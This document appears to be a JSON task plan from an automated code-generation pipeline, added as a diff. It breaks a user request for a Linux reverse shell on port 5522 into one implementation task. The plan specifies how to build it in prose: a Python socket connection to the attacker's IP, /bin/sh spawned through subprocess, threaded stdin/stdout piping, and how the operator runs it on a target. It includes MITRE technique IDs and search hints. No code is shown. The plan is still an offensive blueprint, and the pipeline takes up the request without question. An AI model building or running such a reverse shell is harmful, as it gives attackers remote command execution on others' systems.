@@ -1,0 +1,34 @@
+{
+  "plan_id": "PLAN_20261105_15_37_11",
+  "source_query": "Generate a Linux reverse shell code, that\nconnects back out to my machine on \nport 5522, so i can get a shell on it from my terminal and \nexecute shell commands through that remote connection",
+  "stage1_ref": "20261105_15_37_11.json",
+  "tasks": [
+    {
+      "task_id": "TASK_001",
+      "task_type": "initial_access",
+      "suggested_filename": "reverse_shell.py",
+      "description": "Implements a Linux reverse shell that connects back to the attacker's machine on port 5522, enabling remote command execution through stdin/stdout streams.",
+      "technique_ids": [
+        "T1059",
+        "T1059.004"
+      ],
+      "dependencies": [],
+      "provides": [
+        "ReverseShellClient"
+      ],
+      "consumes": [],
+      "implementation_details": "Uses Python's socket module to establish a TCP connection to the attacker's IP on port 5522. Spawns /bin/sh via os.popen() or subprocess.Popen(), then pipes stdin/stdout between the shell process and the remote socket using threading.Thread for non-blocking I/O. The client reads commands from the remote socket, executes them locally via a shell, and writes output back to the remote socket.",
+      "rag_retrieval_hints": [
+        "python reverse shell socket example",
+        "linux reverse shell python subprocess stdin stdout"
+      ],
+      "scenario_context": {
+        "narrative_role": "This is the sole task in the plan; it implements the complete reverse shell payload that satisfies the source query end-to-end. It serves as both the initial access mechanism and the final deliverable — a standalone Python script that, when executed on a target Linux system, establishes an outbound TCP connection to port 5522 and enables bidirectional command execution between the remote shell process and the attacker's terminal.",
+        "upstream_assumptions": "No upstream dependencies exist. The task assumes zero pre-existing artifacts: no prior reverse shell client exists, no listener is assumed to be running on the target side, and no other code components are available for composition. It must generate all necessary logic from scratch.",
+        "downstream_contract": "As a terminal task, this script's contract with the human operator is: INPUT — the user runs `python reverse_shell.py <attacker_ip> 5522` (or similar CLI args) on a Linux target machine; OUTPUT — upon successful execution, the process spawns /bin/sh, opens an outbound TCP connection to the specified IP:port, and presents an interactive shell prompt where commands typed by the operator are executed remotely on the target. Observable outputs include stdout/stderr from remote command execution and the interactive shell session itself.",
+        "consistency_notes": "Target OS is Linux (POSIX environment). Use Python 3 standard library only (socket, subprocess, threading, os). The script must be runnable as a standalone file with no external dependencies beyond stdlib. Port 5522 is fixed per the source query. Shell binary is /bin/sh.",
+        "non_goals": "Do NOT implement a listener/server component — this task only implements the client-side reverse shell that connects OUTBOUND to port 5522. Do NOT include encryption, persistence, or multi-stage functionality. Do NOT attempt to bypass firewalls or perform reconnaissance; those are out of scope for this single-task plan."
+      }
+    }
+  ]
+}
